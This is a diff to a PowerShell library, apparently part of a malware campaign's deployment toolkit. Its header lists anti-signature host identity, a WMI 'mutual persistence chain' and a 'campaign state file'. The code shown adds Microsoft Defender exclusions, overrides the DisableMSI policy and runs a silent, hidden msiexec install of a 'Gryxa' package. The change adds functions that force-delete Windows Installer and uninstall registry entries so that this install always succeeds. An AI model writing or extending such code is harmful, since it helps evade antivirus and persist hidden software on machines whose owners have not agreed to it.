@@ -1,9 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L33
+# OWN_LIB  BUILD 20260802L34
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L33: pre-clean target MSI ProductCode before /i (cross-FP ProductCode collision -> maintenance-mode 1603). L32: stale-lock fix.
+# L34: purge phantom Installer ProductCode registration (Installed=00:00:00, no ARP key) that survives /x and forces maintenance-mode 1603. L33: /x preclean.
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
@@ -552,6 +552,34 @@ function Add-ScDefenderExclusion([string]$Fp) {
     } catch {}
 }
 
+function ConvertTo-PackedGuid([string]$Guid) {
+    # Windows Installer stores ProductCodes with reversed segments (packed/squished GUID).
+    $g = $Guid.Trim('{}').Replace('-', '')
+    $sb = New-Object System.Text.StringBuilder
+    # first 3 segments reversed per-char, last 2 segments reversed per-byte-pair
+    $segs = @($g.Substring(0,8), $g.Substring(8,4), $g.Substring(12,4), $g.Substring(16,4), $g.Substring(20,12))
+    for ($i=0; $i -lt 3; $i++) { $c = $segs[$i].ToCharArray(); [array]::Reverse($c); [void]$sb.Append(-join $c) }
+    for ($i=3; $i -lt 5; $i++) { $s = $segs[$i]; for ($j=0; $j -lt $s.Length; $j+=2) { [void]$sb.Append($s[$j+1]); [void]$sb.Append($s[$j]) } }
+    return $sb.ToString().ToUpper()
+}
+
+function Remove-InstallerProductRegistration([string]$ProductCode) {
+    # Purge a phantom/corrupt ProductCode from the Installer database (Installed=00:00:00
+    # registrations that survive ARP removal and make /i fail 1603 in maintenance mode).
+    if (-not $ProductCode) { return }
+    $packed = ConvertTo-PackedGuid $ProductCode
+    $keys = @(
+        "HKLM:\SOFTWARE\Classes\Installer\Products\$packed",
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\$packed",
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$ProductCode",
+        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\$ProductCode"
+    )
+    foreach ($k in $keys) {
+        if (Test-Path -LiteralPath $k) { Remove-Item -LiteralPath $k -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+    & reg.exe delete "HKCR\Installer\Products\$packed" /f 2>&1 | Out-Null
+}
+
 function Start-GryxaInstall([string]$MsiPath, [string]$Fp, [string]$LogFile) {
     Add-ScDefenderExclusion $Fp
     # L33: the new gryxa MSI can share a ProductCode with a prior FP's install (cross-FP
@@ -563,6 +591,10 @@ function Start-GryxaInstall([string]$MsiPath, [string]$Fp, [string]$LogFile) {
         & reg.exe add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /t REG_DWORD /d 0 /f 2>&1 | Out-Null
         Start-Process msiexec.exe -ArgumentList "/x $pc /qn /norestart REBOOT=ReallySuppress" -Wait -WindowStyle Hidden
         Start-Sleep -Seconds 5
+        # L34: phantom registration (Installed=00:00:00, no ARP key) survives /x and still
+        # forces maintenance-mode 1603. Purge it from the Installer database so /i is a
+        # true first-time INSTALL.
+        Remove-InstallerProductRegistration $pc
     }
     $cmd = Join-Path $WorkDir 'gryxa_install.cmd'
     $lines = @(
